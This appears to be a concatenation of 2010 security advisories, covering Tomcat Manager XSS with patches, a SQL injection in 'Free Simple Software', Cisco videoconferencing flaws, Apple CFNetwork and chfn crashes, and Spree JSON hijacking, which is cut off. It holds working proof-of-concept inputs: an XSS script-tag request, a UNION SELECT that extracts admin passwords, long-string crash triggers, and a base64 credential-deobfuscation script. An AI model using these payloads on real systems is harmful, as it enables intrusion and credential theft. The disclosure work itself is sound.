CVE-2010-4172: Apache Tomcat Manager application XSS vulnerability
Severity: Tomcat 7.0.x - Low, Tomcat 6.0.x - Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.4
- Not affected in default configuration.
- Affected if CSRF protection is disabled
- Additional XSS issues if web applications are untrusted
- - Tomcat 6.0.12 to 6.0.29
- Affected in default configuration
- Additional XSS issues if web applications are untrusted
- - Tomcat 5.5.x
- Not affected
Description:
The session list screen (provided by sessionList.jsp) in affected
versions uses the orderBy and sort request parameters without applying
filtering and therefore is vulnerable to a cross-site scripting attack.
Users should be aware that Tomcat 6 does not use httpOnly for session
cookies by default so this vulnerability could expose session cookies
from the manager application to an attacker.
A review of the Manager application by the Apache Tomcat security team
identified additional XSS vulnerabilities if the web applications
deployed were not trusted.
Example:
GET
/manager/html/sessions?path=/&sort=""><script>alert('xss')</script>order=ASC&action=injectSessions&refresh=Refresh+Sessions+list
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Tomcat 7.0.0 to 7.0.4
- Remove the Manager application
- Remove the sessionList.jsp and sessionDetail.jsp files
- Ensure the CSRF protection is enabled
- Apply the patch 7.0.4 patch (see below)
- Update to 7.0.5 when released
- - Tomcat 6.0.12 to 6.0.29
- Remove the Manager application
- Remove the sessionList.jsp and sessionDetail.jsp files
- Apply the patch for 6.0.29 (see below)
- Update to 6.0.30 when released
No release date has been set for the next Tomcat 7.0.x and Tomcat 6.0.x
releases.
Credit:
The original issue was discovered by Adam Muntner of Gotham Digital Science.
Additional issues were identified by the Tomcat security team as a
result of reviewing the original issue.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
Note: The patches The Apache Tomcat Security Team
****************
Patch for 6.0.29
****************
Index: webapps/manager/WEB-INF/jsp/sessionDetail.jsp
===================================================================
- --- webapps/manager/WEB-INF/jsp/sessionDetail.jsp (revision 1037769)
+++ webapps/manager/WEB-INF/jsp/sessionDetail.jsp (working copy)
@@ -30,8 +30,10 @@
<% String path = (String) request.getAttribute(""path"");
Session currentSession =
(Session)request.getAttribute(""currentSession"");
HttpSession currentHttpSession = currentSession.getSession();
- - String currentSessionId = currentSession.getId();
- - String submitUrl =
((HttpServletRequest)pageContext.getRequest()).getRequestURL().toString();
+ String currentSessionId = JspHelper.escapeXml(currentSession.getId());
+ String submitUrl = JspHelper.escapeXml(
+ ((HttpServletRequest)
pageContext.getRequest()).getRequestURI() +
+ ""?path="" + path);
%>
<head>
<meta http-equiv=""content-type"" content=""text/html;
charset=iso-8859-1""/>
@@ -45,7 +47,7 @@
<title>Sessions Administration: details for <%= currentSessionId
%></title>
</head>
<body>
- -<h1>Details for Session <%= JspHelper.escapeXml(currentSessionId) %></h1>
+<h1>Details for Session <%= currentSessionId %></h1>
<table style=""text-align: left;"" border=""0"">
<tr>
@@ -54,7 +56,7 @@
</tr>
<tr>
<th>Guessed Locale</th>
- - <td><%= JspHelper.guessDisplayLocaleFromSession(currentSession)
%></td>
+ <td><%=
JspHelper.escapeXml(JspHelper.guessDisplayLocaleFromSession(currentSession))
%></td>
</tr>
<tr>
<th>Guessed User</th>
@@ -120,7 +122,7 @@
String attributeName = (String)
attributeNamesEnumeration.nextElement();
%>
<tr>
- - <td align=""center""><form action=""<%= submitUrl %>""><div><input
type=""hidden"" name=""path"" value=""<%= path %>"" /><input type=""hidden""
name=""action"" value=""removeSessionAttribute"" /><input type=""hidden""
name=""sessionId"" value=""<%= currentSessionId %>"" /><input type=""hidden""
name=""attributeName"" value=""<%= attributeName %>"" /><input type=""submit""
value=""Remove"" /></div></form></td>
+ <td align=""center""><form action=""<%= submitUrl %>""><div><input
type=""hidden"" name=""action"" value=""removeSessionAttribute"" /><input
type=""hidden"" name=""sessionId"" value=""<%= currentSessionId %>"" /><input
type=""hidden"" name=""attributeName"" value=""<%=
JspHelper.escapeXml(attributeName) %>"" /><input type=""submit""
value=""Remove"" /></div></form></td>
<td><%= JspHelper.escapeXml(attributeName) %></td>
<td><% Object attributeValue =
currentHttpSession.getAttribute(attributeName); %><span title=""<%=
attributeValue == null ? """" : attributeValue.getClass().toString()
%>""><%= JspHelper.escapeXml(attributeValue) %></span></td>
</tr>
Index: webapps/manager/WEB-INF/jsp/sessionsList.jsp
===================================================================
- --- webapps/manager/WEB-INF/jsp/sessionsList.jsp (revision 1037769)
+++ webapps/manager/WEB-INF/jsp/sessionsList.jsp (working copy)
@@ -26,7 +26,9 @@
<html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"">
<% String path = (String) request.getAttribute(""path"");
- - String submitUrl =
((HttpServletRequest)pageContext.getRequest()).getRequestURI() +
""?path="" + path;
+ String submitUrl = JspHelper.escapeXml(
+ ((HttpServletRequest)
pageContext.getRequest()).getRequestURI() +
+ ""?path="" + path);
Collection activeSessions = (Collection)
request.getAttribute(""activeSessions"");
%>
<head>
@@ -38,10 +40,10 @@
<meta name=""author"" content=""Cedrik LIME""/>
<meta name=""copyright"" content=""copyright 2005-2010 the Apache
Software Foundation""/>
<meta name=""robots"" content=""noindex,nofollow,noarchive""/>
- - <title>Sessions Administration for <%= path %></title>
+ <title>Sessions Administration for <%= JspHelper.escapeXml(path)
%></title>
</head>
<body>
- -<h1>Sessions Administration for <%= path %></h1>
+<h1>Sessions Administration for <%= JspHelper.escapeXml(path) %></h1>
<p>Tips:</p>
<ul>
@@ -55,13 +57,13 @@
<form action=""<%= submitUrl %>"" method=""post"" id=""sessionsForm"">
<fieldset><legend>Active HttpSessions informations</legend>
<input type=""hidden"" name=""action"" id=""sessionsFormAction""
value=""injectSessions""/>
- - <input type=""hidden"" name=""sort"" id=""sessionsFormSort"" value=""<%=
(String) request.getAttribute(""sort"") %>""/>
+ <input type=""hidden"" name=""sort"" id=""sessionsFormSort"" value=""<%=
JspHelper.escapeXml(request.getAttribute(""sort"")) %>""/>
<% String order = (String) request.getAttribute(""order"");
if (order == null || """".equals(order)) {
order = ""ASC"";
}
%>
- - <input type=""hidden"" name=""order"" id=""sessionsFormSortOrder""
value=""<%= order %>""/>
+ <input type=""hidden"" name=""order"" id=""sessionsFormSortOrder""
value=""<%= JspHelper.escapeXml(order) %>""/>
<input type=""submit"" name=""refresh"" id=""refreshButton"" value=""Refresh
Sessions list""
onclick=""document.getElementById('sessionsFormAction').value='refreshSessions';
return true;""/>
<%= JspHelper.formatNumber(activeSessions.size()) %> active Sessions<br/>
<table border=""1"" cellpadding=""2"" cellspacing=""2"" width=""100%"">
@@ -95,13 +97,13 @@
<% Iterator iter = activeSessions.iterator();
while (iter.hasNext()) {
Session currentSession = (Session) iter.next();
- - String currentSessionId = currentSession.getId();
+ String currentSessionId = JspHelper.escapeXml(currentSession.getId());
%>
<tr>
<td>
- -<input type=""checkbox"" name=""sessionIds"" value=""<%= currentSessionId
%>"" /><a href=""<%= submitUrl
%>&amp;action=sessionDetail&amp;sessionId=<%= currentSessionId %>""
target=""_blank""><%= JspHelper.escapeXml(currentSessionId) %></a>
+<input type=""checkbox"" name=""sessionIds"" value=""<%= currentSessionId
%>"" /><a href=""<%= submitUrl
%>&amp;action=sessionDetail&amp;sessionId=<%= currentSessionId %>""
target=""_blank""><%= currentSessionId %></a>
</td>
- - <td style=""text-align: center;""><%=
JspHelper.guessDisplayLocaleFromSession(currentSession) %></td>
+ <td style=""text-align: center;""><%=
JspHelper.escapeXml(JspHelper.guessDisplayLocaleFromSession(currentSession))
%></td>
<td style=""text-align: center;""><%=
JspHelper.guessDisplayUserFromSession(currentSession) %></td>
<td style=""text-align: center;""><%=
JspHelper.getDisplayCreationTimeForSession(currentSession) %></td>
<td style=""text-align: center;""><%=
JspHelper.getDisplayLastAccessedTimeForSession(currentSession) %></td>
***************
Patch for 7.0.4
***************
Index: webapps/manager/WEB-INF/jsp/sessionDetail.jsp
===================================================================
- --- webapps/manager/WEB-INF/jsp/sessionDetail.jsp (revision 1037768)
+++ webapps/manager/WEB-INF/jsp/sessionDetail.jsp (working copy)
@@ -30,9 +30,10 @@
<% String path = (String) request.getAttribute(""path"");
Session currentSession =
(Session)request.getAttribute(""currentSession"");
HttpSession currentHttpSession = currentSession.getSession();
- - String currentSessionId = currentSession.getId();
- - String submitUrl = response.encodeURL(((HttpServletRequest)
- - pageContext.getRequest()).getRequestURL().toString());
+ String currentSessionId = JspHelper.escapeXml(currentSession.getId());
+ String submitUrl = JspHelper.escapeXml(response.encodeURL(
+ ((HttpServletRequest)
pageContext.getRequest()).getRequestURI() +
+ ""?path="" + path));
%>
<head>
<meta http-equiv=""content-type"" content=""text/html;
charset=iso-8859-1""/>
@@ -46,7 +47,7 @@
<title>Sessions Administration: details for <%= currentSessionId
%></title>
</head>
<body>
- -<h1>Details for Session <%= JspHelper.escapeXml(currentSessionId) %></h1>
+<h1>Details for Session <%= currentSessionId %></h1>
<table style=""text-align: left;"" border=""0"">
<tr>
@@ -55,7 +56,7 @@
</tr>
<tr>
<th>Guessed Locale</th>
- - <td><%= JspHelper.guessDisplayLocaleFromSession(currentSession)
%></td>
+ <td><%=
JspHelper.escapeXml(JspHelper.guessDisplayLocaleFromSession(currentSession))
%></td>
</tr>
<tr>
<th>Guessed User</th>
@@ -89,7 +90,6 @@
<form method=""post"" action=""<%= submitUrl %>"">
<div>
- - <input type=""hidden"" name=""path"" value=""<%= path %>"" />
<input type=""hidden"" name=""sessionId"" value=""<%= currentSessionId
%>"" />
<input type=""hidden"" name=""action"" value=""sessionDetail"" />
<input type=""submit"" value=""Refresh"" />
@@ -131,10 +131,9 @@
<td align=""center"">
<form method=""post"" action=""<%= submitUrl %>"">
<div>
- - <input type=""hidden"" name=""path"" value=""<%=
path %>"" />
<input type=""hidden"" name=""action""
value=""removeSessionAttribute"" />
<input type=""hidden"" name=""sessionId""
value=""<%= currentSessionId %>"" />
- - <input type=""hidden"" name=""attributeName""
value=""<%= attributeName %>"" />
+ <input type=""hidden"" name=""attributeName""
value=""<%= JspHelper.escapeXml(attributeName) %>"" />
<%
if
(""Primary"".equals(request.getAttribute(""sessionType""))) {
%>
@@ -156,7 +155,6 @@
<form method=""post"" action=""<%=submitUrl%>"">
<p style=""text-align: center;"">
- - <input type=""hidden"" name=""path"" value=""<%= path %>"" />
<input type=""submit"" value=""Return to session list"" />
</p>
</form>
Index: webapps/manager/WEB-INF/jsp/sessionsList.jsp
===================================================================
- --- webapps/manager/WEB-INF/jsp/sessionsList.jsp (revision 1037768)
+++ webapps/manager/WEB-INF/jsp/sessionsList.jsp (working copy)
@@ -28,8 +28,9 @@
<%@page import=""org.apache.catalina.manager.DummyProxySession""%><html
xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"">
<% String path = (String) request.getAttribute(""path"");
- - String submitUrl = response.encodeURL(((HttpServletRequest)
- - pageContext.getRequest()).getRequestURI() + ""?path="" + path);
+ String submitUrl = JspHelper.escapeXml(response.encodeURL(
+ ((HttpServletRequest)
pageContext.getRequest()).getRequestURI() +
+ ""?path="" + path));
Collection activeSessions = (Collection)
request.getAttribute(""activeSessions"");
%>
<head>
@@ -41,10 +42,10 @@
<meta name=""author"" content=""Cedrik LIME""/>
<meta name=""copyright"" content=""copyright 2005-2010 the Apache
Software Foundation""/>
<meta name=""robots"" content=""noindex,nofollow,noarchive""/>
- - <title>Sessions Administration for <%= path %></title>
+ <title>Sessions Administration for <%= JspHelper.escapeXml(path)
%></title>
</head>
<body>
- -<h1>Sessions Administration for <%= path %></h1>
+<h1>Sessions Administration for <%= JspHelper.escapeXml(path) %></h1>
<p>Tips:</p>
<ul>
@@ -58,13 +59,13 @@
<form action=""<%= submitUrl %>"" method=""post"" id=""sessionsForm"">
<fieldset><legend>Active HttpSessions informations</legend>
<input type=""hidden"" name=""action"" id=""sessionsFormAction""
value=""injectSessions""/>
- - <input type=""hidden"" name=""sort"" id=""sessionsFormSort""
value=""<%= (String) request.getAttribute(""sort"") %>""/>
+ <input type=""hidden"" name=""sort"" id=""sessionsFormSort""
value=""<%= JspHelper.escapeXml(request.getAttribute(""sort"")) %>""/>
<% String order = (String) request.getAttribute(""order"");
if (order == null || """".equals(order)) {
order = ""ASC"";
}
%>
- - <input type=""hidden"" name=""order"" id=""sessionsFormSortOrder""
value=""<%= order %>""/>
+ <input type=""hidden"" name=""order"" id=""sessionsFormSortOrder""
value=""<%= JspHelper.escapeXml(order) %>""/>
<input type=""submit"" name=""refresh"" id=""refreshButton""
value=""Refresh Sessions list""
onclick=""document.getElementById('sessionsFormAction').value='refreshSessions';
return true;""/>
<%= JspHelper.formatNumber(activeSessions.size()) %> active
Sessions<br/>
<table border=""1"" cellpadding=""2"" cellspacing=""2"" width=""100%"">
@@ -100,7 +101,7 @@
<% Iterator iter = activeSessions.iterator();
while (iter.hasNext()) {
Session currentSession = (Session) iter.next();
- - String currentSessionId = currentSession.getId();
+ String currentSessionId =
JspHelper.escapeXml(currentSession.getId());
String type;
if (currentSession instanceof DeltaSession) {
if (((DeltaSession) currentSession).isPrimarySession()) {
@@ -121,13 +122,13 @@
out.print(currentSessionId);
} else {
%>
- - <a href=""<%= submitUrl
%>&amp;action=sessionDetail&amp;sessionId=<%= currentSessionId
%>&amp;sessionType=<%= type %>""><%=
JspHelper.escapeXml(currentSessionId) %></a>
+ <a href=""<%= submitUrl
%>&amp;action=sessionDetail&amp;sessionId=<%= currentSessionId
%>&amp;sessionType=<%= type %>""><%= currentSessionId %></a>
<%
}
%>
</td>
<td style=""text-align: center;""><%= type %></td>
- - <td style=""text-align: center;""><%=
JspHelper.guessDisplayLocaleFromSession(currentSession) %></td>
+ <td style=""text-align: center;""><%=
JspHelper.escapeXml(JspHelper.guessDisplayLocaleFromSession(currentSession))
%></td>
<td style=""text-align: center;""><%=
JspHelper.guessDisplayUserFromSession(currentSession) %></td>
<td style=""text-align: center;""><%=
JspHelper.getDisplayCreationTimeForSession(currentSession) %></td>
<td style=""text-align: center;""><%=
JspHelper.getDisplayLastAccessedTimeForSession(currentSession) %></td>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJM6sBuAAoJEBDAHFovYFnnrHEQAPA2QmgMopWAzEynFt0htLUS
Dx0A8gl4grLLIjDcwCM+jzc44dn0zzSTuXZkhAbCE+gnLpQSCMf1iQmX3hwOKCHx
MgHpWIhpon6FB1+AE3HtqQ2MzH/IUeA0ji2F/nWKors4zdkdpNNZG3O4tNzsd108
IXrDaoJheD0ek9N51PYAuN1ZEhMWnkTYPvpGjCcSn5sj2LYqEGpdrifLBx5QbwZu
eOVJHufomeU6lanogTtSaXUhDmfm0NM72OCxm597R9L10Xll2D2AK0MvTZjWf5Mr
xZiotdlFc6E5PPNtdUOO34HW/ClYrTjWQB1RoY8yUnRjRx8a8tZ+rrX9TCfPuy7x
Os8nOEAjWtUYZmP4I+o0c8tcurpF9gP6rITOL4JZlZPB++ZtzILU4NGzoxsQ5WtZ
U1eIgnH1GcboOAu0TKfxESrDFutruN9PvgIaQPdBftENShk20CNBXfaWatkE0nnv
YZS9R5dviKa/u7cNZEusGQirc65bdDuG2u97bZkqoYyywwpeBC7QKEiPfqnfa9Ju
DkucGnejMDbWa5kgvDQH/i0vnyy2lyknGo/vuZMsgVWffgKQoLG0TLk4hg4Evafv
nWeeepnIdDTTc2KuiqO1F/KSGB7VmR8E2ySGj62g75bJOnSzVMpSpwfF/F7FYMsi
NAKAGVImnKte7ogGqU94
=gjUw
-----END PGP SIGNATURE-----"
13854,'Free Simple Software' SQL Injection Vulnerability (CVE-2010-4298),,CVE-2010-4298,"'Free Simple Software' SQL Injection Vulnerability (CVE-2010-4298)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'Free Simple Software' download module which allows for a 'UNION SELECT' to easily expose the application administrator's plaintext password.
II. TESTED VERSION
---------------------------------------
1.0 [Manual Install Version]
III. PoC EXPLOIT
---------------------------------------
http://site.com/index.php?page=downloads&request=download_now&downloads_id=' UNION SELECT email_address as name, NULL, NULL, password as file_name, last_name as file_url from admin_users where id!='NULL
IV. NOTES
---------------------------------------
* User passwords for this web application are not encrypted or hashed which makes this exploit even more concerning.
* The PoC assumes that the first user is the administrative user which is the default behavior for the application.
* At least 1 download must already exist to enable this exploit.
* Due to a previous vulnerability not being fixed 3-months after disclosure (CVE-2010-3307), it's assumable that this application is not being actively developed.
V. SOLUTION
---------------------------------------
Do not utilize the download module. No patch/upgrade is available at this time.
VI. REFERENCES
---------------------------------------
http://www.freesimplesoft.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4298
https://www.uncompiled.com/2010/11/free-simple-software-sql-injection-vulnerability-cve-2010-4298/
VII. TIMELINE
---------------------------------------
11/12/2010: Initial disclosure e-mail to the vendor
11/21/2010: Public disclosure"
13872,Cisco Unified Videoconferencing multiple vulnerabilities - CVE-2010-3037 CVE-2010-3038,,CVE-2010-3037,"Matta Consulting - Matta Advisory
http://www.trustmatta.com
Cisco Unified Videoconferencing multiple vulnerabilities
Advisory ID: MATTA-2010-001
CVE reference: CVE-2010-3037 CVE-2010-3038
Affected platforms: Cisco Unified Videoconferencing 3515,3522,3527,5230,3545,
5110,5115 Systems and unspecified Radvision systems
Version: 7.0.1.13.3 at least and more likely all
Date: 2010-August-03
Security risk: Critical
Exploitable from: Remote
Vulnerability: Multiple vulnerabilities
Researcher: Florent Daigniere
Vendor Status: Notified, working on a patch
Vulnerability Disclosure Policy:
http://www.trustmatta.com/advisories/matta-disclosure-policy-01.txt
Permanent URL:
http://www.trustmatta.com/advisories/MATTA-2010-001.txt
=====================================================================
Description:
During an external pentest exercise for one of our clients, multiple
vulnerabilities and weaknesses were found on the Cisco CUVC-5110-HD10 which
allowed us to ultimately gain access to the internal network.
- - Hard-coded credentials - CVE-2010-3038
Three accounts have a login shell and a password the administrator can neither
disable nor change. The affected accounts are ""root"", ""cs"" and ""develop"".
Matta didn't spend the CPU cycles required to get those passwords but will
provide the salted hashes to interested parties. The credentials can be used
against both the FTP and the SSH daemon running on the device.
- - Services misconfiguration
There is an FTP daemon (vsftpd) running but no mention in the documentation
of what it might be useful for. User credentials created from the
web-interface allow to explore the filesystem/firmware of the device.
The file /etc/shadow has read permissions for all.
The ssh daemon (openssh) has a non-default but curious configuration. It
allows port-forwarding and socks proxies to be created, X11 to be
forwarded... even with the restricted shells.
The daemon binding the port of the web-interface is running as root.
- - Weak session IDs on the web interface
Session IDs are timestamps of when the user logged-in and are trivial to
forge. There are numerous ways of remotely gathering the remote time and
uptime, the easiest being to ask over RPC... Assuming that a user or an
administrator logged into the device shortly after it was powered up, and
that the network connectivity is fast, it is practical to bruteforce a
valid session id.
Using this vulnerability, a non-authenticated attacker can authenticate.
- - Usage of cookies to store credentials
Credentials to access the web interface are stored in base64 format in the
cookie sent by the browser. Over http in default configuration. While users
are not expected to reuse their credentials, in practice they do; this is
an information-disclosure bug.
- - Remote Command Injection on the web-interface - CVE-2010-3037
The script at /goform/websXMLAdminRequestCgi.cgi is vulnerable to remote
command injection (post authentication). Many parameters can be abused,
including but not limited to the ""username"" field. Obviously, as the
webserver is running as root, it can lead to complete compromise of the
device.
- - Weak obfuscation of credentials
The configuration file /opt/rv/Versions/CurrentVersion/Mcu/Config/Mcu.val
contains obfuscated passwords which are trivial to reveal. This is an
information-disclosure bug. Best practices recommend using PBKDF2 to store
passwords.
=====================================================================
Impact
If successful, a malicious third party can get full control of the device and
harvest user passwords with little to no effort. The Attacker might
reposition and launch an attack against other parts of the target
infrastructure from there.
=====================================================================
Versions affected:
Firmware version 7.0.1.13.3 tested. All deployed versions are probably
vulnerable.
=====================================================================
Threat mitigation
Until a patch is issued by the vendor, Matta recommends you unplug the
device from its network socket.
=====================================================================
Base64 encoded decryption script for the credentials:
IyEvYmluL2Jhc2gKIyBTbWFsbCBzY3JpcHQgdG8gZGVvYmZ1c2NhdGUgQ2lzY28gQ1VWQy01MTEw
LUhEMTAncyBwYXNzd29yZHMKIyBAc2VlIE1BVFRBLTIwMTAtMDAxCiMKIyAkMSBpcyB0aGUgb2Jm
dXNjYXRlZCBwYXNzd29yZAojIGV4YW1wbGUgdXNhZ2U6CiMKIyAkLi9kZWNvZGUtcGFzc3dvcmQu
c2ggZDVjNGQ2ZDZkMmNhZDdjMQojIHBhc3N3b3JkCiMKIwoKZWNobyAtbiAkMXxzZWQgJ3MvXCgu
LlwpL1wxXG4vZyd8d2hpbGUgcmVhZCBsaW5lCmRvCgljYXNlICIkbGluZSIgaW4KCQljNCkgbD1h
IDs7CgkJZTQpIGw9QSA7OwoJCWM3KSBsPWIgOzsKCQllNykgbD1CIDs7CgkJYzYpIGw9YyA7OwoJ
CWU2KSBsPUMgOzsKCQljMSkgbD1kIDs7CgkJZTEpIGw9RCA7OwoJCWMwKSBsPWUgOzsKCQllMCkg
bD1FIDs7CgkJYzMpIGw9ZiA7OwoJCWUzKSBsPUYgOzsKCQljMikgbD1nIDs7CgkJZTIpIGw9RyA7
OwoJCWNkKSBsPWggOzsKCQllZCkgbD1IIDs7CgkJY2MpIGw9aSA7OwoJCWVjKSBsPUkgOzsKCQlj
ZikgbD1qIDs7CgkJZWYpIGw9SiA7OwoJCWNlKSBsPWsgOzsKCQllZSkgbD1LIDs7CgkJYzkpIGw9
bCA7OwoJCWU5KSBsPUwgOzsKCQljOCkgbD1tIDs7CgkJZTgpIGw9TSA7OwoJCWNiKSBsPW4gOzsK
CQllYikgbD1OIDs7CgkJY2EpIGw9byA7OwoJCWRhKSBsPU8gOzsKCQlkNSkgbD1wIDs7CgkJZjUp
IGw9UCA7OwoJCWQ0KSBsPXEgOzsKCQlmNCkgbD1RIDs7CgkJZDcpIGw9ciA7OwoJCWY3KSBsPVIg
OzsKCQlkNikgbD1zIDs7CgkJZjYpIGw9UyA7OwoJCWQxKSBsPXQgOzsKCQlmMSkgbD1UIDs7CgkJ
ZDApIGw9dSA7OwoJCWYwKSBsPVUgOzsKCQlkMykgbD12IDs7CgkJZjMpIGw9ViA7OwoJCWQyKSBs
PXcgOzsKCQlmMikgbD1XIDs7CgkJZGQpIGw9eCA7OwoJCWZkKSBsPVggOzsKCQlkYykgbD15IDs7
CgkJZmMpIGw9WSA7OwoJCWRmKSBsPXogOzsKCQlmZikgbD1aIDs7CgoJCTk1KSBsPTAgOzsKCQk5
NCkgbD0xIDs7CgkJOTcpIGw9MiA7OwoJCTk2KSBsPTMgOzsKCQk5MSkgbD00IDs7CgkJOTApIGw9
NSA7OwoJCTkzKSBsPTYgOzsKCQk5MikgbD03IDs7CgkJOWQpIGw9OCA7OwoJCTljKSBsPTkgOzsK
CQkqKSAgbD0/OzsKCWVzYWMKCWVjaG8gLW4gIiRsIjsKZG9uZQplY2hvICIiCg==
=====================================================================
Credits
This vulnerability was discovered and researched by Florent Daigniere from
Matta Consulting.
Thank you to Paul Oxman and Matthew Cerha from the Cisco PSIRT for the
coordination effort.
=====================================================================
History
30-07-10 initial discovery
05-08-10 our client has mitigated the risk for his infrastructure
...
23-08-10 initial attempt to contact the vendor
23-08-10 sent pre-advisory to the vendor
PSIRT on psirt cisco com using PGP id 0xCF14FEE0
23-08-10 reply from the vendor, case PSIRT-0217563645 is open
...
21-09-10 agreement on the public disclosure date
...
08-11-10 planned disclosure date (missed), CVE assignments
...
17-11-10 public disclosure
=====================================================================
About Matta
Matta is a privately held company with Headquarters in London, and a European
office in Amsterdam. Established in 2001, Matta operates in Europe, Asia,
the Middle East and North America using a respected team of senior
consultants. Matta is an accredited provider of Tigerscheme training;
conducts regular research and is the developer behind the webcheck
application scanner, and colossus network scanner.
http://www.trustmatta.com
http://www.trustmatta.com/webapp_va.html
http://www.trustmatta.com/network_va.html
=====================================================================
Disclaimer and Copyright
Copyright (c) 2010 Matta Consulting Limited. All rights reserved.
This advisory may be distributed as long as its distribution is
free-of-charge and proper credit is given.
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Matta Consulting disclaims all warranties, either
express or implied, including the warranties of merchantability and fitness
for a particular purpose. In no event shall Matta Consulting or its
suppliers be liable for any damages whatsoever including direct, indirect,
incidental, consequential, loss of business profits or special damages,
even if Matta Consulting or its suppliers have been advised of the
possibility of such damages."
13906,[TEHTRI-Security] CVE-2010-1752: Update your MacOSX,,CVE-2010-1752,"Gents,
During the 1st HITB Amsterdam 2010, TEHTRI-Security made advisories
about security issues on handled devices (iPhone, HTC, iPad, BlackBerry,
etc).
As we made penetration tests for more than 15 years on highly sensitive
networks, we were luckily able to find vulnerabilities working on those
devices, thanks to audits & fuzzing in our lab.
Basically, the offensive stuff shared with Apple security team, could
allow an attacker to abuse a vulnerability in the CFNetwork library
(stack overflow) on the iPhone devices.
Notice that if you already updated your iPhone with iOS4, our exploits
for this particular vulnerability would not work anymore.
( search for ""CVE-2010-1752"" here: http://support.apple.com/kb/ht4225 )
But, thanks to our proof of concepts (client-side attacks), it was not
only possible to abuse the iPhone devices, but also any current Mac OS X
( Mac OS X v10.5.8, Mac OS X Server v10.5.8, Mac OS X v10.6 through
v10.6.4, Mac OS X Server v10.6 through v10.6.4 ).
Hopefully, this week, Apple released many interesting security patches
for Mac OS X, and one of them will allow Mac end users to avoid those
kind of client-side attacks and stack overflows against the CFNetwork
library (which is used by many applications, like Safari).
If you want more information, we wrote some lines on our blog:
http://blog.tehtri-security.com/2010/11/cve-2010-1752-back-to-mac.html
And it's also covered on Apple web site.
( search ""CVE-2010-1752"" here too: http://support.apple.com/kb/HT4435 ).
Happy update, Apple folks ;-)
Best regards,
Laurent OUDOT, from Abu Dhabi, UAE @ BlackHat Briefings
( http://blackhat.com/html/bh-ad-10/bh-ad-10-briefings.html#Oudot )
TEHTRI-Security - ""This is not a Game.""
http://www.tehtri-security.com/
http://twitter/tehtris"
13909,Apple Directory Services Memory Corruption - CVE-2010-1840,,CVE-2010-1840,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Apple Directory Services Memory Corruption
CVE-2010-1840
INTRODUCTION
chfn, chpass and chsh dos not properly parse authname switch (""-u""), which causes the applications to crash when parsing a long string. Those binaries are setuid root by default.
This problem was confirmed in the following versions of Apple binaries and MacOS, other versions may be also affected:
Apple Mac OS X 10.5.8 32bits /usr/bin/chfn, /usr/bin/chpass, /usr/bin/chsh
Apple Mac OS X 10.6.2 64bits /usr/bin/chfn, /usr/bin/chpass, /usr/bin/chsh
CVSS Scoring System
The CVSS score is: 3.3
Base Score: 4.2
Temporal Score: 3.3
We used the following values to calculate the scores:
Base score is: AV:L/AC:L/Au:R/C:C/I:C/A:C
Temporal score is: E:POC/RL:OF/RC:C
TRIGGERING THE PROBLEM
/usr/bin/chfn -u `perl -e 'print ""A"" x 3000'`
/usr/bin/chsh -u `perl -e 'print ""A"" x 3000'`
/usr/bin/chpass -u `perl -e 'print ""A"" x 3000'`
DETAILS
Disassembly:
0x92237215 <CFArrayGetValueAtIndex+101>: mov $0x28,%al
0x92237217 <CFArrayGetValueAtIndex+103>: cmp $0xc,%ecx
0x9223721a <CFArrayGetValueAtIndex+106>: mov $0x14,%dl
0x9223721c <CFArrayGetValueAtIndex+108>: cmovne %edx,%eax
0x9223721f <CFArrayGetValueAtIndex+111>: add %esi,%eax
0x92237221 <CFArrayGetValueAtIndex+113>: mov 0xc(%ebp),%edx
0x92237224 <CFArrayGetValueAtIndex+116>: lea (%eax,%edx,4),%eax
0x92237227 <CFArrayGetValueAtIndex+119>: mov (%eax),%eax <----- Crash here.
(gdb) x/i $pc
0x92237227 <CFArrayGetValueAtIndex+119>: mov (%eax),%eax
(gdb) i r $eax
eax 0x585d910 92657936
(gdb) bt
#0 0x92237227 in CFArrayGetValueAtIndex ()
#1 0x9225c46b in _CFBundleTryOnePreferredLprojNameInDirectory ()
#2 0x9225d80c in _CFBundleAddPreferredLprojNamesInDirectory ()
#3 0x9224b7b0 in _CFBundleGetLanguageSearchList ()
#4 0x9225d8da in _CFBundleAddPreferredLprojNamesInDirectory ()
#5 0x9224b7b0 in _CFBundleGetLanguageSearchList ()
#6 0x9225b50c in CFBundleCopyResourceURL ()
#7 0x9225bb32 in CFBundleCopyLocalizedString ()
#8 0x903633eb in _ODNodeSetCredentials ()
#9 0x90369813 in ODRecordSetNodeCredentials ()
#10 0x000044be in ?? ()
#11 0x000026ac in ?? ()
#12 0x000022ee in ?? ()
The MacOS Heap Protection mechanisms mitigates the impact of this vulnerability.
CREDITS
This vulnerability was researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
ACKNOWLEDGES
Many thanks to Rafael Silva who brought the issue in chfn binary to our attention.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies
http://www.checkpoint.com/defense"
13940,Spree e-commerce JSON Hijacking Vulnerabilities - CVE-2010-3978,,CVE-2010-3978,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Spree e-commerce JSON Hijacking Vulnerabilities
CVE-2010-3978
INTRODUCTION
Spree e-commerce is an open source commerce platform written for the Ruby on Rails framework supporting ""Over 100 extensions created by our active and dedicated community"".
This problem was confirmed in the following versions of the Spree e-commerce, other versions maybe also affected.
All 0.11.x versions
The upcoming code 0.30.x versions
CVSS Scoring System
The CVSS score is: 2.7
Base Score: 3.3
Temporal Score: 2.7
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:N/A:N
